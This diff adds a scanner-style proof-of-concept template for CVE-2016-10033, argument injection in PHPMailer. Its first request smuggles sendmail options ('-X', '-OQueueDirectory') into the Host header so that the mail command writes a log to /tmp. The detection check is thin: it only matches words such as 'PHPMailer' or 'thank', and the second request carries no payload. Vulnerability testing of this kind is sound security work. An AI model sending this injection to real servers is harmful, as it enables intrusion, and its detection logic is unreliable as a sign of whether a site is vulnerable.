@@ -1,0 +1,60 @@
+[info]
+author = "ave"
+description = "检测 PHPMailer 5.2.18 之前版本 isMail 传输中的参数注入漏洞，通过构造恶意 Sender 属性向 mail 命令注入额外参数实现远程代码执行"
+id = "POC-AVE-2016-0088"
+name = "PHPMailer < 5.2.18 Remote Code Execution PoC"
+severity = "critical"
+tags = [
+    "cve-2016-10033",
+    "phpmailer",
+    "rce",
+    "argument-injection",
+]
+vuln_id = [
+    "CVE-2016-10033",
+    "AVE-2016-0088",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-admin/options-general.php"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Host = '""" -X -OQueueDirectory=/tmp -X/tmp/test.log'
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["PHPMailer"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/contact.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "name=test&email=attacker@test.com&message=test&subject=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "sent",
+    "success",
+    "thank",
+]
